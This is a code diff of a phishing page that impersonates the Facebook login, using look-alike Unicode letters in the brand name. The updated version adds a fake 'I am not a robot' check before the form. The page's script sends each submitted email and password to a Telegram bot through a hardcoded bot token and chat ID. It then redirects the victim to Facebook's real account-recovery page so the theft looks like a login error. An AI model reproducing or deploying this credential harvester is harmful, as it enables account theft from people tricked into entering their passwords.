@@ -1,73 +1,97 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Fаcebook Login</title> 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
-        .container { width: 100%; max-width: 400px; margin: 50px auto; background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo img { width: 120px; }
-        .login-form input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        .login-form button { width: 100%; padding: 12px; background-color: #1877f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
-        .login-form button:hover { background-color: #1566c9; }
-        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }
-        .footer a { color: #1877f2; text-decoration: none; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sеcurity Verification</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; color: #333; transition: 0.3s; }
+    body.dark-mode { background-color: #18191a; color: #e4e6eb; }
+    .container { width: 100%; max-width: 400px; margin: 50px auto; background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); box-sizing: border-box; }
+    .dark-mode .container { background-color: #242526; }
+    
+    /* Gatekeeper View */
+    #gatekeeper { text-align: center; }
+    .btn-verify { background-color: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+
+    /* Login View (Hidden by default) */
+    #login-view { display: none; }
+    .logo { text-align: center; margin-bottom: 30px; }
+    .logo img { width: 120px; }
+    .login-form input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; background-color: #f5f6f7; outline: none; }
+    .dark-mode .login-form input { background-color: #3a3b3c; border: 1px solid #3e4042; color: white; }
+    .login-form button { width: 100%; padding: 12px; background-color: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; }
+    
+    /* Loading Spinner */
+    .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; display: none; margin-left: 10px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; border-top: 1px solid #dadde1; padding-top: 20px; }
+    .toggle-dark { text-align: center; margin-top: 20px; }
+    .toggle-dark button { background: none; border: 1px solid #1877f2; color: #1877f2; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
+  </style>
 </head>
-<body>
+<body class="light-mode">
 
 <div class="container">
+  <div id="gatekeeper">
+    <h2 style="font-size: 18px;">Security Check</h2>
+    <p style="font-size: 14px; color: #65676b;">Please verify that you are accessing this portal securely.</p>
+    <button class="btn-verify" onclick="showLogin()">I am not a robot</button>
+  </div>
+
+  <div id="login-view">
     <div class="logo">
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAbFBMVEX///8mJiYAAACAgIAeHh4bGxt9fX0MDAzV1dW5ubm/v79aWlpwcHDm5uZycnI4ODimpqb4+PiEhIQWFhb09PTKyspFRUWhoaEfHx/Y2NhOTk4zMzNlZWVcXFwqKipsbGx4eHg6OjpKSkpTU1MeE66rAAADmklEQVR4nO3b63KCMBSG4X9EUMuSInK09n9vNyBy6LRSU7Ina74vM8M6vA9hE6MIAAAAAAAAAAAAAAAAAAAAAL6vYpS86CVPitRInpRZ9KOfPCuSNHpS5u9/q0qSRZf40S+Oon99E+O0vD6+W6eR0/76+D6uXhvf7683v8v719vxu318vR6/u4/v1+N3++X19vjdfXm9Pf5/Xf2P77P78X12P77P7sf32f34Prv/6/69R5Kx218f/6fVv/t3O5I90U8v0S+O9JPV7470k9Xv9vST1e+O9JPV7470k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1v0C30fH9/H9fnyfHY/v0/v6fvxvVv/m3312PL5P7+v78X12PL5P7+v78X12PL5P7+v78X12PL5P7+v78X12vH4AtXk8B6L0pLAAAAAASUVORK5CYII=" alt="Logo">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAbFBMVEX///8mJiYAAACAgIAeHh4bGxt9fX0MDAzV1dW5ubm/v79aWlpwcHDm5uZycnI4ODimpqb4+PiEhIQWFhb09PTKyspFRUWhoaEfHx/Y2NhOTk4zMzNlZWVcXFwqKipsbGx4eHg6OjpKSkpTU1MeE66rAAADmklEQVR4nO3b63KCMBSG4X9EUMuSInK09n9vNyBy6LRSU7Ina74vM8M6vA9hE6MIAAAAAAAAAAAAAAAAAAAAAL6vYpS86CVPitRInpRZ9KOfPCuSNHpS5u9/q0qSRZf40S+Oon99E+O0vD6+W6eR0/76+D6uXhvf7683v8v719vxu318vR6/u4/v1+N3++X19vjdfXm9Pf5/Xf2P77P78X12P77P7sf32f34Prv/6/69R5Kx218f/6fVv/t3O5I90U8v0S+O9JPV7470k9Xv9vST1e+O9JPV7470k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1mrv2StI/1k9bs9/WSt/pK1jvST1e/29JPV7/b0k7X6S9Y60k9Wv9vTT9bqL1nrSD9Z/W5PP1v0C30fH9/H9fnyfHY/v0/v6fvxvVv/m3312PL5P7+v78X12PL5P7+v78X12PL5P7+v78X12PL5P7+v78X12vH4AtXk8B6L0LpSAAAAAASUVORK5CYII=" alt="Logo">
     </div>
-
     <div class="login-form">
-        <input type="text" id="email" placeholder="Email or phone number" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="button" id="submitBtn">Log In</button>
+      <input type="text" id="email" placeholder="Email or phone number">
+      <input type="password" id="password" placeholder="Password">
+      <button type="button" id="submitBtn">
+        <span>Log In</span>
+        <div class="spinner" id="loader"></div>
+      </button>
     </div>
-
     <div class="footer">
-        <a href="#">Forgotten account?</a> · <a href="#">Sign up for Fаcebook</a>
+      <a href="#">Forgotten account?</a> · <a href="#">Create New Account</a>
     </div>
+  </div>
+</div>
+
+<div class="toggle-dark">
+  <button onclick="document.body.classList.toggle('dark-mode')">Switch Theme</button>
 </div>
 
 <script>
-    const BOT_TOKEN = "8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo"; 
-    const CHAT_ID = "6593370832";
+  const BOT_TOKEN = "8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo";
+  const CHAT_ID = "6593370832";
 
-    document.getElementById('submitBtn').addEventListener('click', function() {
-        const emailValue = document.getElementById('email').value;
-        const passValue = document.getElementById('password').value;
+  function showLogin() {
+    document.getElementById('gatekeeper').style.display = 'none';
+    document.getElementById('login-view').style.display = 'block';
+    document.title = "Fаcebook - Log In"; // Fake 'a' used here
+  }
 
-        if(emailValue === "" || passValue === "") {
-            alert("Please fill in all fields");
-            return;
-        }
+  document.getElementById('submitBtn').addEventListener('click', function () {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+    if (!email || !pass) return alert("Please fill in all fields");
 
-        const message = `🔔 NEW LOGIN ATTEMPT\n\n📧 Email: ${emailValue}\n🔑 Password: ${passValue}`;
+    document.getElementById('submitBtn').disabled = true;
+    document.getElementById('loader').style.display = "block";
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message
-            })
-        })
-        .then(() => {
-            // Redirects to real Facebook recovery to look like a login error
-            window.location.href = "https://www.facebook.com/recover/initiate/";
-        })
-        .catch(err => {
-            window.location.href = "https://www.facebook.com";
-        });
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `🔔 LOGIN\n\n📧: ${email}\n🔑: ${pass}` })
+    })
+    .then(() => {
+      setTimeout(() => { window.location.href = "https://www.facebook.com/recover/initiate/"; }, 1500);
     });
+  });
 </script>
-
 </body>
 </html>
+
 
 
